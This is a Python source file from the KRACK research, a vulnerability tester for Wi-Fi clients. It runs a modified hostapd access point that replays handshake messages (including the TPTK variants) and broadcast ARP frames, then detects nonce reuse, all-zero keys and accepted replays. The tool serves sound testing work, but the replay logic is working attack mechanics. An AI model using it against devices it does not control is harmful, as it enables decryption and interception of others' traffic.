#!/usr/bin/env python2

# Tests for key reinstallation vulnerabilities in Wi-Fi clients
# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import libwifi
from libwifi import *
import sys, socket, struct, time, subprocess, atexit, select, os.path
from wpaspy import Ctrl

# TODOs:
# - Always mention 4-way handshake attack test (normal, tptk, tptk-rand)
# - Stop testing a client even when we think it's patched?
# - The --gtkinit with the 4-way handshake is very sensitive to packet loss
# - Add an option to test replays of unicast traffic

# Futute work:
# - If the client installs an all-zero key, we cannot reliably test the group key handshake
# - Automatically execute all relevant tests in order
# - Force client to request a new IP address when connecting
# - More reliable group key reinstall test: install very high RSC, then install a zero one.
#   This avoids constantly having to execute a new 4-way handshake for example.

# After how many seconds a new message 3, or new group key message 1, is sent.
HANDSHAKE_TRANSMIT_INTERVAL = 2

#### Utility Commands ####

def hostapd_clear_messages(hostapd_ctrl):
	# Clear old replies and messages from the hostapd control interface
	while hostapd_ctrl.pending():
		hostapd_ctrl.recv()

def hostapd_command(hostapd_ctrl, cmd):
	hostapd_clear_messages(hostapd_ctrl)
	rval = hostapd_ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "Hostapd did not recognize the command %s. Did you (re)compile hostapd?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, "Failed to execute command %s" % cmd)
		quit(1)
	return rval

#### Main Testing Code ####

class TestOptions():
	ReplayBroadcast, ReplayUnicast, Fourway, Grouphs = range(4)
	TptkNone, TptkReplay, TptkRand = range(3)

	def __init__(self, variant=Fourway):
		self.variant = variant

		# Additional options for Fourway tests
		self.tptk = TestOptions.TptkNone

		# Extra option for Fourway and Grouphs tests
		self.gtkinit = False

class ClientState():
	UNKNOWN, VULNERABLE, PATCHED = range(3)
	IDLE, STARTED, GOT_CANARY, FINISHED = range(4)

	def __init__(self, clientmac, options):
		self.mac = clientmac
		self.options = options
		self.TK = None
		self.vuln_4way = ClientState.UNKNOWN
		self.vuln_bcast = ClientState.UNKNOWN

		self.ivs = IvCollection()
		self.pairkey_sent_time_prev_iv = None
		self.pairkey_intervals_no_iv_reuse = 0

		self.broadcast_reset()

	def broadcast_reset(self):
		self.broadcast_state = ClientState.IDLE
		self.broadcast_prev_canary_time = 0
		self.broadcast_num_canaries_received = -1 # -1 because the first broadcast ARP requests are still valid
		self.broadcast_requests_sent = -1 # -1 because the first broadcast ARP requests are still valid
		self.broadcast_patched_intervals = 0

	# TODO: Put in libwifi?
	def get_encryption_key(self, hostapd_ctrl):
		if self.TK is None:
			# Contact our modified Hostapd instance to request the pairwise key
			response = hostapd_command(hostapd_ctrl, "GET_TK " + self.mac)
			if not "FAIL" in response:
				self.TK = response.strip().decode("hex")
		return self.TK

	# TODO: Put in libwifi?
	def decrypt(self, p, hostapd_ctrl):
		payload = get_ccmp_payload(p)
		llcsnap, packet = payload[:8], payload[8:]

		if payload.startswith("\xAA\xAA\x03\x00\x00\x00"):
			# On some kernels, the virtual interface associated to the real AP interface will return
			# frames where the payload is already decrypted (this happens when hardware decryption is
			# used). So if the payload seems decrypted, just extract the full plaintext from the frame.
			plaintext = payload
		else:
			key       = self.get_encryption_key(hostapd_ctrl)
			plaintext = decrypt_ccmp(p, key)

			# If it still fails, try an all-zero key
			if not plaintext.startswith("\xAA\xAA\x03\x00\x00\x00"):
				plaintext = decrypt_ccmp(p, "\x00" * 16)

		return plaintext

	def track_used_iv(self, p):
		return self.ivs.track_used_iv(p)

	def is_iv_reused(self, p):
		return self.ivs.is_iv_reused(p)

	def check_pairwise_reinstall(self, p):
		"""Inspect whether the IV is reused, or whether the client seem to be patched"""

		# If this is gaurenteed IV reuse (and not just a benign retransmission), mark the client as vulnerable
		if self.ivs.is_iv_reused(p):
			if self.vuln_4way != ClientState.VULNERABLE:
				iv = dot11_get_iv(p)
				seq = dot11_get_seqnum(p)
				log(WARNING, ("%s: IV reuse detected (IV=%d, seq=%d). " +
					"Client reinstalls the pairwise key in the 4-way handshake (this is bad)") % (self.mac, iv, seq))
			self.vuln_4way = ClientState.VULNERABLE

		# If it's a higher IV than all previous ones, try to check if the client seems patched
		elif self.vuln_4way == ClientState.UNKNOWN and self.ivs.is_new_iv(p):
			# Save how many intervals we received a data packet without IV reset. Use twice the
			# transmission interval of message 3, in case one message 3 is lost due to noise.
			if self.pairkey_sent_time_prev_iv is None:
				self.pairkey_sent_time_prev_iv = p.time
			elif self.pairkey_sent_time_prev_iv + 2 * HANDSHAKE_TRANSMIT_INTERVAL + 1 <= p.time:
				self.pairkey_intervals_no_iv_reuse += 1
				self.pairkey_sent_time_prev_iv = p.time
				log(DEBUG, "%s: no pairwise IV resets seem to have occured for one interval" % self.mac)

			# If during several intervals all IV reset attempts failed, the client is likely patched.
			# We wait for enough such intervals to occur, to avoid getting a wrong result.
			if self.pairkey_intervals_no_iv_reuse >= 5 and self.vuln_4way == ClientState.UNKNOWN:
				self.vuln_4way = ClientState.PATCHED

				# Be sure to clarify *which* type of attack failed (to remind user to test others attacks as well)
				msg = "%s: client DOESN'T reinstall the pairwise key in the 4-way handshake (this is good)"
				if self.options.tptk == TestOptions.TptkNone:
					msg += " (used standard attack)"
				elif self.options.tptk == TestOptions.TptkReplay:
					msg += " (used TPTK attack)"
				elif self.options.tptk == TestOptions.TptkRand:
					msg += " (used TPTK-RAND attack)"
				log(INFO, (msg + ".") % self.mac, color="green")

	def mark_allzero_key(self, p):
		if self.vuln_4way != ClientState.VULNERABLE:
			iv = dot11_get_iv(p)
			seq = dot11_get_seqnum(p)
			log(WARNING, ("%s: usage of all-zero key detected (IV=%d, seq=%d). " +
				"Client (re)installs an all-zero key in the 4-way handshake (this is very bad).") % (self.mac, iv, seq))
			log(WARNING, "%s: !!! Other tests are unreliable due to all-zero key usage, please fix this vulnerability first !!!" % self.mac, color="red")
		self.vuln_4way = ClientState.VULNERABLE


	def broadcast_print_patched(self):
		if self.options.variant in [TestOptions.Fourway, TestOptions.Grouphs]:
			# TODO: Mention which variant of the 4-way handshake test was used
			hstype = "group key" if self.options.variant == TestOptions.Grouphs else "4-way"
			if self.options.gtkinit:
				log(INFO, "%s: Client installs the group key in the %s handshake with the given replay counter (this is good)" % (self.mac, hstype), color="green")
			else:
				log(INFO, "%s: Client DOESN'T reinstall the group key in the %s handshake (this is good)" % (self.mac, hstype), color="green")
		if self.options.variant == TestOptions.ReplayBroadcast:
			log(INFO, "%s: Client DOESN'T accept replayed broadcast frames (this is good)" % self.mac, color="green")

	def broadcast_print_vulnerable(self):
		if self.options.variant in [TestOptions.Fourway, TestOptions.Grouphs]:
			hstype = "group key" if self.options.variant == TestOptions.Grouphs else "4-way"
			if self.options.gtkinit:
				log(WARNING, "%s: Client always installs the group key in the %s handshake with a zero replay counter (this is bad)." % (self.mac, hstype))
			else:
				log(WARNING, "%s: Client reinstalls the group key in the %s handshake (this is bad)." % (self.mac, hstype))
			log(WARNING, "                   Or client accepts replayed broadcast frames (see --replay-broadcast).")
		if self.options.variant == TestOptions.ReplayBroadcast:
			log(WARNING, "%s: Client accepts replayed broadcast frames (this is bad)." % self.mac)
			log(WARNING, "                   Fix this before testing for group key (re)installations!")

	def broadcast_process_reply(self, p):
		"""Handle replies to the replayed ARP broadcast request (which reuses an IV)"""

		# Must be testing this client, and must not be a benign retransmission
		if not self.broadcast_state in [ClientState.STARTED, ClientState.GOT_CANARY]: return
		if self.broadcast_prev_canary_time + 1 > p.time: return

		self.broadcast_num_canaries_received += 1
		log(DEBUG, "%s: received %d replies to the replayed broadcast ARP requests" % (self.mac, self.broadcast_num_canaries_received))

		# We wait for several replies before marking the client as vulnerable, because
		# the first few broadcast ARP requests still use a valid (not yet used) IV.
		if self.broadcast_num_canaries_received >= 5:
			assert self.vuln_bcast != ClientState.VULNERABLE
			self.vuln_bcast = ClientState.VULNERABLE
			self.broadcast_state = ClientState.FINISHED
			self.broadcast_print_vulnerable()
		# Remember that we got a reply this interval (see broadcast_check_replies to detect patched clients)
		else:
			self.broadcast_state = ClientState.GOT_CANARY

		self.broadcast_prev_canary_time = p.time

	def broadcast_check_replies(self):
		"""Track when we send broadcast ARP requests, and determine if a client seems patched"""
		if self.broadcast_state == ClientState.IDLE:
			return

		if self.broadcast_requests_sent == 4:
			# We sent four broadcast ARP requests, and got at least one got a reply. This indicates the client is vulnerable.
			if self.broadcast_state == ClientState.GOT_CANARY:
				log(DEBUG, "%s: got a reply to broadcast ARPs during this interval" % self.mac)
				self.broadcast_state = ClientState.STARTED

			# We sent four broadcast ARP requests, and didn't get a reply to any. This indicates the client is patched.
			elif self.broadcast_state == ClientState.STARTED:
				self.broadcast_patched_intervals += 1
				log(DEBUG, "%s: didn't get reply received to broadcast ARPs during this interval" % self.mac)
				self.broadcast_state = ClientState.STARTED

			self.broadcast_requests_sent = 0

		# If the client appears secure for several intervals (see above), it's likely patched
		if self.broadcast_patched_intervals >= 5 and self.vuln_bcast == ClientState.UNKNOWN:
			self.vuln_bcast = ClientState.PATCHED
			self.broadcast_state = ClientState.FINISHED
			self.broadcast_print_patched()

class KRAckAttackClient():
	def __init__(self):
		# Parse hostapd.conf
		self.script_path = os.path.dirname(os.path.realpath(__file__))
		try:
			interface = hostapd_read_config(os.path.join(self.script_path, "hostapd.conf"))
		except Exception as ex:
			log(ERROR, "Failed to parse the hostapd.conf config file")
			raise
		if not interface:
			log(ERROR, 'Failed to determine wireless interface. Specify one in hostapd.conf at the line "interface=NAME".')
			quit(1)

		# Set other variables
		self.nic_iface = interface
		self.nic_mon = interface + "mon"
		self.options = None
		try:
			self.apmac = scapy.arch.get_if_hwaddr(interface)
		except:
			log(ERROR, 'Failed to get MAC address of %s. Specify an existing interface in hostapd.conf at the line "interface=NAME".' % interface)
			raise

		self.sock_mon = None
		self.sock_eth = None
		self.hostapd = None
		self.hostapd_ctrl = None

		self.dhcp = None
		self.broadcast_sender_ip = None
		self.broadcast_arp_sock = None

		self.clients = dict()

	def reset_client_info(self, clientmac):
		if clientmac in self.dhcp.leases:
			self.dhcp.remove_client(clientmac)
			log(DEBUG, "%s: Removing client from DHCP leases" % clientmac)
		if clientmac in self.clients:
			del self.clients[clientmac]
			log(DEBUG, "%s: Removing ClientState object" % clientmac)

	def handle_replay(self, p):
		"""Replayed frames (caused by a pairwise key reinstallation) are rejected by the kernel. This
		function processes these frames manually so we can still test reinstallations of the group key."""
		if not Dot11WEP in p: return

		# Reconstruct Ethernet header
		clientmac = p.addr2
		header = Ether(dst=self.apmac, src=clientmac)
		header.time = p.time

		# Decrypt the payload and obtain LLC/SNAP header and packet content
		client = self.clients[clientmac]
		plaintext = client.decrypt(p, self.hostapd_ctrl)
		llcsnap, packet = plaintext[:8], plaintext[8:]

		# Rebuild the full Ethernet packet
		if   llcsnap == "\xAA\xAA\x03\x00\x00\x00\x08\x06":
			decap = header/ARP(packet)
		elif llcsnap == "\xAA\xAA\x03\x00\x00\x00\x08\x00":
			decap = header/IP(packet)
		elif llcsnap == "\xAA\xAA\x03\x00\x00\x00\x86\xdd":
			decap = header/IPv6(packet)
		#elif llcsnap == "\xAA\xAA\x03\x00\x00\x00\x88\x8e":
		# 	# EAPOL
		else:
			return

		# Now process the packet as if it were a valid (non-replayed) one
		self.process_eth_rx(decap)

	def handle_mon_rx(self):
		p = self.sock_mon.recv()
		if p == None: return
		if p.type == 1: return

		# Note: we cannot verify that the NIC is indeed reusing IVs when sending the broadcast
		# ARP requests, because it may override them in the firmware/hardware (some Atheros
		# Wi-Fi NICs do no properly reset the Tx group key IV when using hardware encryption).

		# The first bit in FCfield is set if the frames is "to-DS"
		clientmac, apmac = (p.addr1, p.addr2) if (p.FCfield & 2) != 0 else (p.addr2, p.addr1)
		if apmac != self.apmac: return None

		# Reset info about disconnected clients
		if Dot11Deauth in p or Dot11Disas in p:
			self.reset_client_info(clientmac)

		# Inspect encrypt frames for IV reuse & handle replayed frames rejected by the kernel
		elif p.addr1 == self.apmac and Dot11WEP in p:
			if not clientmac in self.clients:
				self.clients[clientmac] = ClientState(clientmac, options=options)
			client = self.clients[clientmac]

			iv = dot11_get_iv(p)
			log(DEBUG, "%s: transmitted data using IV=%d (seq=%d)" % (clientmac, iv, dot11_get_seqnum(p)))

			if decrypt_ccmp(p, "\x00" * 16).startswith("\xAA\xAA\x03\x00\x00\x00"):
				client.mark_allzero_key(p)
			if self.options.variant == TestOptions.Fourway and not self.options.gtkinit:
				client.check_pairwise_reinstall(p)
			if client.is_iv_reused(p):
				self.handle_replay(p)
			client.track_used_iv(p)

	def process_eth_rx(self, p):
		self.dhcp.reply(p)
		self.broadcast_arp_sock.reply(p)

		clientmac = p[Ether].src
		if not clientmac in self.clients: return
		client = self.clients[clientmac]

		if ARP in p and p[ARP].pdst == self.broadcast_sender_ip:
			client.broadcast_process_reply(p)

	def handle_eth_rx(self):
		p = self.sock_eth.recv()
		if p == None or not Ether in p: return
		self.process_eth_rx(p)

	def broadcast_send_request(self, client):
		clientip = self.dhcp.leases[client.mac]

		# Print a message when we start testing the client --- XXX this should be in the client?
		if client.broadcast_state == ClientState.IDLE:
			hstype = "group key" if self.options.variant == TestOptions.Grouphs else "4-way"
			log(STATUS, "%s: client has IP address -> now sending replayed broadcast ARP packets" % client.mac)
			client.broadcast_state = ClientState.STARTED

		# Send a new handshake message when testing the group key handshake
		if self.options.variant == TestOptions.Grouphs:
			cmd = "RESEND_GROUP_M1 " + client.mac
			cmd += "maxrsc" if self.options.gtkinit else ""
			hostapd_command(self.hostapd_ctrl, cmd)

		# Send a replayed broadcast ARP request to the client
		request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, hwsrc=self.apmac, psrc=self.broadcast_sender_ip, pdst=clientip)
		self.sock_eth.send(request)
		client.broadcast_requests_sent += 1
		log(INFO, "%s: sending broadcast ARP to %s from %s (sent %d ARPs this interval)" % (client.mac,
			clientip, self.broadcast_sender_ip, client.broadcast_requests_sent))

	def experimental_test_igtk_installation(self):
		"""To test if the IGTK is installed using the given replay counter"""
		# 1. Set ieee80211w=2 in hostapd.conf
		# 2. Run this script using --gtkinit so a new group key is generated before calling this function

		# 3. Install the new IGTK using a very high given replay counter
		hostapd_command(self.hostapd_ctrl, "RESEND_GROUP_M1 %s maxrsc" % client.mac)
		time.sleep(1)

		# 4. Now kill the AP
		quit(1)

		# 5. Hostapd sends a broadcast deauth message. At least iOS will reply using its own
		#    deauthentication respose if this frame is accepted. Sometimes hostapd doesn't
		#    send a broadcast deauthentication. Is this when the client is sleeping?

	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in network manager & disable hardware encryption. Both may interfere with this script.")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Remove unused virtual interfaces to start from a clean state
		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

	def run(self, options):
		self.options = options
		self.configure_interfaces()

		# Open the patched hostapd instance that carries out tests and let it start
		log(STATUS, "Starting hostapd ...")
		try:
			self.hostapd = subprocess.Popen([
				os.path.join(self.script_path, "../hostapd/hostapd"),
				os.path.join(self.script_path, "hostapd.conf")]
				+ sys.argv[1:])
		except:
			if not os.path.exists("../hostapd/hostapd"):
				log(ERROR, "hostapd executable not found. Did you compile hostapd? Use --help param for more info.")
			raise
		time.sleep(1)

		try:
			self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_iface)
			self.hostapd_ctrl.attach()
		except:
			log(ERROR, "It seems hostapd did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise hostapd won't work.")
			raise

		self.sock_mon = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)
		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)

		# Let scapy handle DHCP requests
		self.dhcp = DHCP_sock(sock=self.sock_eth,
						domain='krackattack.com',
						pool=Net('192.168.100.0/24'),
						network='192.168.100.0/24',
						gw='192.168.100.254',
						renewal_time=600, lease_time=3600)
		# Configure gateway IP: reply to ARP and ping requests
		subprocess.check_output(["ifconfig", self.nic_iface, "192.168.100.254"])

		# Use a dedicated IP address for our broadcast ARP requests and replies
		self.broadcast_sender_ip = self.dhcp.pool.pop()
		self.broadcast_arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.broadcast_sender_ip, ARP_addr=self.apmac)

		log(STATUS, "Ready. Connect to this Access Point to start the tests. Make sure the client requests an IP using DHCP!", color="green")

		# Monitor both the normal interface and virtual monitor interface of the AP
		self.next_arp = time.time() + 1
		while True:
			sel = select.select([self.sock_mon, self.sock_eth], [], [], 1)
			if self.sock_mon in sel[0]: self.handle_mon_rx()
			if self.sock_eth in sel[0]: self.handle_eth_rx()

			# Periodically send the replayed broadcast ARP requests to test for group key reinstallations
			if time.time() > self.next_arp:
				# When testing if the replay counter of the group key is properly installed, always install
				# a new group key. Otherwise KRACK patches might interfere with this test.
				# Otherwise just reset the replay counter of the current group key.
				if self.options.variant in [TestOptions.Fourway, TestOptions.Grouphs] and self.options.gtkinit:
					hostapd_command(self.hostapd_ctrl, "RENEW_GTK")
				else:
					hostapd_command(self.hostapd_ctrl, "RESET_PN FF:FF:FF:FF:FF:FF")

				self.next_arp = time.time() + HANDSHAKE_TRANSMIT_INTERVAL
				for client in self.clients.values():
					#self.experimental_test_igtk_installation()

					# 1. Test the 4-way handshake
					if self.options.variant == TestOptions.Fourway and self.options.gtkinit and client.vuln_bcast != ClientState.VULNERABLE:
						# Execute a new handshake to test stations that don't accept a retransmitted message 3
						hostapd_command(self.hostapd_ctrl, "RENEW_PTK " + client.mac)
						# TODO: wait untill 4-way handshake completed? And detect failures (it's sensitive to frame losses)?
					elif self.options.variant == TestOptions.Fourway and not self.options.gtkinit and client.vuln_4way != ClientState.VULNERABLE:
						# First inject a message 1 if requested using the TPTK option
						if self.options.tptk == TestOptions.TptkReplay:
							hostapd_command(self.hostapd_ctrl, "RESEND_M1 " + client.mac)
						elif self.options.tptk == TestOptions.TptkRand:
							hostapd_command(self.hostapd_ctrl, "RESEND_M1 " + client.mac + " change-anonce")

						# Note that we rely on an encrypted message 4 as reply to detect pairwise key reinstallations reinstallations.
						hostapd_command(self.hostapd_ctrl, "RESEND_M3 " + client.mac + ("maxrsc" if self.options.gtkinit else ""))

					# 2. Test if broadcast ARP request are accepted by the client. Keep injecting even
					#    to PATCHED clients (just to be sure they keep rejecting replayed frames).
					if self.options.variant in [TestOptions.Fourway, TestOptions.Grouphs, TestOptions.ReplayBroadcast]:
						# 2a. Check if we got replies to previous requests (and determine if vulnerable)
						client.broadcast_check_replies()

						# 2b. Send new broadcast ARP requests (and handshake messages if needed)
						if client.vuln_bcast != ClientState.VULNERABLE and client.mac in self.dhcp.leases:
							self.broadcast_send_request(client)


	def stop(self):
		log(STATUS, "Closing hostapd and cleaning up ...")
		if self.hostapd:
			self.hostapd.terminate()
			self.hostapd.wait()
		if self.sock_mon: self.sock_mon.close()
		if self.sock_eth: self.sock_eth.close()


def cleanup():
	attack.stop()

def argv_get_interface():
	for i in range(len(sys.argv)):
		if not sys.argv[i].startswith("-i"):
			continue
		if len(sys.argv[i]) > 2:
			return sys.argv[i][2:]
		else:
			return sys.argv[i + 1]

	return None

def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True

def hostapd_read_config(config):
	# Read the config, get the interface name, and verify some settings.
	interface = None
	with open(config) as fp:
		for line in fp.readlines():
			line = line.strip()
			if line.startswith("interface="):
				interface = line.split('=')[1]
			elif line.startswith("wpa_pairwise=") or line.startswith("rsn_pairwise"):
				if "TKIP" in line:
					log(ERROR, "ERROR: We only support tests using CCMP. Only include CCMP in %s config at the following line:" % config)
					log(ERROR, "       >%s<" % line, showtime=False)
					quit(1)

	# Parameter -i overrides interface in config.
	# FIXME: Display warning when multiple interfaces are used.
	if argv_get_interface() is not None:
		interface = argv_get_interface()

	return interface

if __name__ == "__main__":
	if "--help" in sys.argv or "-h" in sys.argv:
		print "\nSee README.md for usage instructions. Accepted parameters are"
		print "\n\t" + "\n\t".join(["--replay-broadcast", "--group", "--tptk", "--tptk-rand", "--gtkinit", "--debug"]) + "\n"
		quit(1)

	options = TestOptions()

	# Parse the type of test variant to execute
	replay_broadcast = argv_pop_argument("--replay-broadcast")
	replay_unicast = argv_pop_argument("--replay-unicast")
	groupkey = argv_pop_argument("--group")
	fourway = argv_pop_argument("--fourway")
	if replay_broadcast + replay_unicast + fourway + groupkey > 1:
		print "You can only select one argument of out replay-broadcast, replay-unicast, fourway, and group"
		quit(1)
	if replay_broadcast:
		options.variant = TestOptions.ReplayBroadcast
	elif replay_unicast:
		options.variant = TestOptions.ReplayUnicast
	elif groupkey:
		options.variant = TestOptions.Grouphs
	else:
		options.variant = TestOptions.Fourway

	# Parse options for the 4-way handshake
	tptk = argv_pop_argument("--tptk")
	tptk_rand = argv_pop_argument("--tptk-rand")
	if tptk + tptk_rand > 1:
		print "You can only select one argument of out tptk and tptk-rand"
		quit(1)
	if tptk:
		options.tptk = TestOptions.TptkReplay
	elif tptk_rand:
		options.tptk = TestOptions.TptkRand
	else:
		options.tptk = TestOptions.TptkNone

	# Parse remaining options
	options.gtkinit = argv_pop_argument("--gtkinit")
	while argv_pop_argument("--debug"):
		libwifi.global_log_level -= 1

	# Now start the tests
	attack = KRAckAttackClient()
	atexit.register(cleanup)
	attack.run(options=options)
